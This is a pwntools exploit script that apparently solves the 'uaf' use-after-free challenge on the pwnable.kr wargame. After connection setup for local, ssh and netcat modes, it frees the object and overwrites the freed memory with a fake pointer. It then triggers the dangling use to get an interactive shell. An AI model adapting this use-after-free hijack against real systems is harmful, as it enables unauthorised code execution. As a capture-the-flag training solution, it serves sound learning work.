#!/usr/bin/python3
# coding=utf-8
# __author__:TaQini

from pwn import *
import socket
import sys
import re

local_file = './uaf'
local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc  # '../libc.so.6'

is_local = False
is_remote = False
is_argv=True #是否带参运行
#data_final= #参数

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
    elf = ELF(local_file)
elif len(sys.argv) > 1:
    is_remote = True
    if sys.argv[1] == 'ssh':
        username, host = sys.argv[2].split('@')
        port = int(sys.argv[3])
        password = sys.argv[4]
        sh = ssh(username, host, port, password)
        if is_argv==True:
            p=sh.process(argv=[local_file,'24','/dev/stdin'])
        else:
            p = sh.process(local_file)
        #elf = ELF(local_file)
    elif sys.argv[1] == 'nc':
        conn = remote(sys.argv[2], sys.argv[3])
    elif sys.argv[1]=='local':
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("pwnable.kr",9007))
    else:
        # len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
        p = remote(host, port)
        libc = ELF(remote_libc)

    '''else:
        host, port = sys.argv[1].split(':')'''


#elf = ELF(local_file)

context.log_level = 'debug'
#context.arch = elf.arch


def se(data): return p.send(data)
def sa(delim, data): return p.sendafter(delim, data)
def sl(data): return p.sendline(data)


def sla(delim, data): return p.sendlineafter(delim, data)
def sea(delim, data): return p.sendafter(delim, data)
def rc(numb=4096): return p.recv(numb)
def ru(delims, drop=True): return p.recvuntil(delims, drop)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info_addr(tag, addr): return p.info(tag + ': {:#x}'.format(addr))

'''def debug(cmd=''):
    if is_local:
        attach(p, cmd)'''


# info
ru('free\n')
sl('3')

ru('free\n')
sl('2')
se(p64(0x00401568))
ru('free\n')
sl('2')
se(p64(0x00401568))
ru('free\n')
sl('1')
p.interactive()
# rop1s


        

#print(conn.recvlines())

# debug()


# system()地址 + 命令字符串地址
